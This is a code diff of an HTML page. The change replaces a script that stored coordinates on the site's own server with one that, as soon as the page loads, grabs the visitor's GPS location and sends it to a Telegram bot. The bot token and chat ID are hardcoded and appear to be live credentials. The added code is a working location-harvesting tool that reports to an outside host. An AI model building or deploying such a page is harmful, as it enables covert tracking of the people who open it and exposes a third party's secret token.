@@ -3,51 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Store GPS Coordinates</title>
-</head>
-<body>
-    <h1>Store GPS Coordinates</h1>
-    <p id="coordinates">Waiting for coordinates...</p>
-
+    <title>Send GPS to Telegram</title>
     <script>
-        // Function to get current GPS coordinates
-        function getCoordinates() {
+        function sendLocationToTelegram(latitude, longitude) {
+            const token = '7440422756:AAH7WUactI9NrJI0J5SpRcPBXIFNDx1ZU9o';
+            const chatId = '6566668050';
+            const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Location sent successfully:', data.result.text);
+                    } else {
+                        console.error('Failed to send location:', data.description);
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendCoordinates);
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        sendLocationToTelegram(latitude, longitude);
+                    },
+                    error => console.error('Error getting location:', error)
+                );
             } else {
-                alert("Geolocation is not supported by this browser.");
+                console.error('Geolocation is not supported by this browser.');
             }
         }
 
-        // Function to send coordinates to store.php
-        function sendCoordinates(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-
-            // Send coordinates to server using fetch API
-            fetch('store.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    latitude: latitude,
-                    longitude: longitude
-                })
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log(data); // Output response from server
-                document.getElementById('coordinates').innerText = 'Coordinates stored successfully.';
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                document.getElementById('coordinates').innerText = 'Failed to store coordinates.';
-            });
-        }
-
-        // Call getCoordinates when page loads
-        getCoordinates();
+        window.onload = getLocation;
     </script>
+</head>
+<body>
+    <h1>Sending GPS Coordinates to Telegram Bot</h1>
+    <p>If you see this message, the script is running.</p>
 </body>
 </html>
